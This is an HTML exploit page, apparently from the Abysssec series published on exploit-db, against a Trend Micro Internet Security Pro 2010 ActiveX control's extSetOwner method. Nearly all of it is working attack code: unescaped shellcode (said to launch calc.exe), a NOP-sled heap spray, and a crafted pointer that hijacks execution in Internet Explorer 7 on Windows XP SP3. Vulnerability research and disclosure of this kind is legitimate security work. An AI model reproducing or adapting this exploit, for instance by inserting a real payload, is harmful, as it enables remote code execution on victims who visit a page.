&lt;!--
 __  __  ____         _    _ ____ 
 |  \/  |/ __ \   /\  | |  | |  _ \
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ &lt;  Day 3 (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/
 
 
  Title            :  Trend Micro Internet Security Pro 2010 ActiveX extSetOwner Remote Code  Execution
  Version          :  UfPBCtrl.DLL  17.50.0.1366 (XP SP3)
  Analysis         :  http://www.abysssec.com
  Vendor           :  http://www.trendmicro.com
  Impact           :  Critical
  Contact          :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter          :  @abysssec
  
  http://www.exploit-db.com/trend-micro-internet-security-pro-2010-activex-extsetowner-remote-code-execution/
 
  SHELLCODE CALC.EXE TESTED ON XPSP3_IE_7
--&gt;
&lt;object ID=&#039;target&#039; classid=&#039;clsid:15DBC3F9-9F0A-472E-8061-043D9CEC52F0&#039;&gt;
 
&lt;/object&gt;
&lt;script&gt;  
     shellcode = unescape(&#039;%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395&#039;+
                    &#039;%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1&#039;+
                    &#039;%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e&#039;+
                    &#039;%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5&#039;+
                    &#039;%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f&#039;+
                    &#039;%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5&#039;+
                    &#039;%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525&#039;+
                    &#039;%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e&#039;);
                       
     nops=unescape(&#039;%u9090%u9090&#039;);
     headersize =20;
     slackspace= headersize + shellcode.length;
     while(nops.length&lt; slackspace) nops+= nops;
     fillblock= nops.substring(0, slackspace);
     block= nops.substring(0, nops.length- slackspace);
     while( block.length+ slackspace&lt;0x50000) block= block+ block+ fillblock;
     memory=new Array();
     for( counter=0; counter&lt;200; counter++) memory[counter]= block + shellcode;     
     target.extSetOwner(unescape(&#039;%ua5de%u3da6&#039;));                 //mshtml.dll [0x3DA6A5DE] = 0A0A0A06       
&lt;/script&gt;